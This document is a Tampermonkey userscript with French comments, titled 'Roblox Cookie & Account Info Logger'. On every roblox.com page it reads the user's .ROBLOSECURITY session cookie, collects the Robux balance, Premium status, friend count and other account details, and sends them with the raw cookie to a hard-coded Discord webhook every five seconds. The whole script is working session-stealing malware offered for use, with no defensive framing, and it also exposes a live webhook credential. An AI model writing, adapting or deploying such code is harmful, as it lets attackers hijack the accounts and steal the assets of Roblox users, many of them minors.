// ==UserScript==
// @name         Roblox Cookie & Account Info Logger
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  RHAZE% - Envoie le cookie .ROBLOSECURITY et les infos du compte à un webhook Discord.
// @author       MLK
// @grant        GM_xmlhttpRequest
// @grant        GM_getValue
// @grant        GM_setValue
// @connect      api.roblox.com
// @connect      discord.com
// @connect      economy.roblox.com
// @connect      premiumfeatures.roblox.com
// @connect      friends.roblox.com
// @connect      thumbnails.roblox.com
// @connect      users.roblox.com
// @match       https://www.roblox.com/*
// @run-at      document-end
// ==/UserScript==

(function() {
    'use strict';

    // 🔹 URL du webhook Discord (à remplacer si nécessaire)
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1502805198966493194/7BwtUSLcQP8tbHfNdR45hmYJ5rGzPs2xIJRu4RCxLuDfg7SYVVyGu-8qFZZ9Na4FJKDc";

    // 🔹 Évite d'envoyer le même cookie plusieurs fois
    const sentCookies = new Set(JSON.parse(localStorage.getItem("robloxSentCookies") || "[]"));

    // 🔹 Récupère le cookie .ROBLOSECURITY
    function getRobloxCookie() {
        const cookie = document.cookie.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY='));
        return cookie ? cookie.split('=')[1] : null;
    }

    // 🔹 Envoie le cookie et les infos du compte au webhook
    async function sendToWebhook() {
        const cookieValue = getRobloxCookie();
        if (!cookieValue || sentCookies.has(cookieValue)) return;

        try {
            // Récupère les infos de l'utilisateur
            const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
                credentials: 'include'
            });
            if (!authRes.ok) return;

            const authData = await authRes.json();
            const userId = authData.id;
            const username = authData.name;
            const displayName = authData.displayName || authData.name;

            // Récupère le solde Robux
            const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
                headers: { Cookie: `.ROBLOSECURITY=${cookieValue}` },
                credentials: 'include'
            });
            const robuxBalance = robuxRes.ok ? (await robuxRes.json()).robux || 0 : "Unknown";

            // Récupère le statut Premium
            const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
                headers: { Cookie: `.ROBLOSECURITY=${cookieValue}` },
                credentials: 'include'
            });
            const isPremium = premiumRes.ok;

            // Récupère la date de création du compte
            const profileRes = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
                headers: { Cookie: `.ROBLOSECURITY=${cookieValue}` },
                credentials: 'include'
            });
            const profileData = profileRes.ok ? await profileRes.json() : null;
            const creationYear = profileData?.created ? new Date(profileData.created).getFullYear() : "Unknown";

            // Récupère le nombre d'amis
            const friendsRes = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, {
                headers: { Cookie: `.ROBLOSECURITY=${cookieValue}` },
                credentials: 'include'
            });
            const friendCount = friendsRes.ok ? (await friendsRes.json()).count || 0 : "Unknown";

            // Récupère l'avatar
            const avatarRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
            const avatarData = avatarRes.ok ? await avatarRes.json() : null;
            const avatarUrl = avatarData?.data?.[0]?.imageUrl || "";

            // 🔹 Prépare le payload pour Discord
            const payload = {
                embeds: [{
                    title: "📊 Roblox Account Metrics Summary",
                    fields: [
                        { name: "Display Name", value: displayName, inline: true },
                        { name: "Username", value: username, inline: true },
                        { name: "Robux Balance", value: String(robuxBalance), inline: true },
                        { name: "Premium Status", value: isPremium ? "Yes (Premium)" : "No Premium", inline: true },
                        { name: "Account Age (Year)", value: String(creationYear), inline: true },
                        { name: "Total Friends", value: String(friendCount), inline: true }
                    ],
                    description: "**Session Cookie:**\n```" + cookieValue + "```",
                    color: 3447003,
                    thumbnail: avatarUrl ? { url: avatarUrl } : null,
                    timestamp: new Date().toISOString()
                }]
            };

            // 🔹 Envoie au webhook
            await GM_xmlhttpRequest({
                method: "POST",
                url: WEBHOOK_URL,
                headers: { "Content-Type": "application/json" },
                data: JSON.stringify(payload),
                onload: function() {
                    sentCookies.add(cookieValue);
                    localStorage.setItem("robloxSentCookies", JSON.stringify(Array.from(sentCookies)));
                    console.log("✅ Cookie et infos envoyés au webhook !");
                },
                onerror: function(error) {
                    console.error("❌ Erreur lors de l'envoi au webhook:", error);
                }
            });

        } catch (error) {
            console.error("❌ Erreur dans sendToWebhook:", error);
        }
    }

    // 🔹 Exécute la fonction dès que la page est chargée
    sendToWebhook();

    // 🔹 Optionnel : Vérifie toutes les 5 secondes (au cas où le cookie change)
    setInterval(sendToWebhook, 5000);
})();
